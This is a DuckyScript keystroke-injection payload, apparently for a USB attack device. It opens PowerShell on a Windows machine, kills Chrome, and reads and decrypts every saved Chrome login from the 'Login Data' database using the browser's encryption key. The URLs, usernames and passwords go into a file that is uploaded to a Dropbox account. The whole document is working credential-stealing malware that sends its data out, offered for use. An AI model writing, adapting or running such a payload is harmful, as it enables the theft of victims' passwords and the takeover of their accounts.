REM TITLE Chrome Extraction
REM AUTHOR Nutcracker181
REM VERSION 2.7


DELAY 1000
GUI r
DELAY 100
STRINGLN powershell
DELAY 1000
STRINGLN_POWERSHELL
DELAY 2500
$DropBoxAccessToken = "DROPBOX API"

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
Stop-Process -Name Chrome

$d = Add-Type -A System.Security
$p = 'public static'
$g = """)]$p extern"
$i = '[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m = "[MarshalAs(UnmanagedType.LP"
$q = '(s,i)'
$f = '(p s,int i)'
$z = $env:LOCALAPPDATA + '\Google\Chrome\User Data'
$u = [Security.Cryptography.ProtectedData]
Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
$s = [W]::O("$z\\Default\\Login Data",[ref]$d)
$l = @()

if ($host.Version -like "7*") {
    $b = (gc "$z\\Local State" | ConvertFrom-Json).os_crypt.encrypted_key
    $key = [Convert]::FromBase64String($b)
    $key = $key[5..($key.Length - 1)]
    $x = [Security.Cryptography.AesGcm]::New($u::Unprotect($key, $null, 0))
} else {
    $x = $null
}

$_ = [W]::P($d, "SELECT * FROM logins WHERE blacklisted_by_user=0", -1, [ref]$s, 0)

while ([W]::S($s) -eq 100) {
    $url = [W]::T($s, 0) # origin_url
    $username = [W]::T($s, 3) # username_value (Column 4)
    $encrypted_password = [W]::B($s, 5) # password_value (Column 6)
    
    if ($encrypted_password -ne $null -and $encrypted_password.Length -gt 0) {
        try {
            if ($x) {
                $k = $encrypted_password.Length
                $password = [byte[]]::new($k - 31)
                $x.Decrypt($encrypted_password[3..14], $encrypted_password[15..($k - 17)], $encrypted_password[($k - 16)..($k - 1)], $password)
                $passwordString = [System.Text.Encoding]::UTF8.GetString($password)
            } else {
                $password = $u::Unprotect($encrypted_password, $null, 0)
                $passwordString = [System.Text.Encoding]::UTF8.GetString($password)
            }
        } catch {
            $passwordString = "N/A"
        }
    } else {
        $passwordString = "N/A"
    }

    $l += "URL: $url"
    $l += "Username: $username"
    $l += "Password: $passwordString"
    $l += ""
}

$l | Out-File -FilePath "$env:TMP\$FileName"



$TargetFilePath="/$FileName"
$SourceFilePath="$env:TMP\$FileName"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers

exit
END_STRINGLN
DELAY 1000
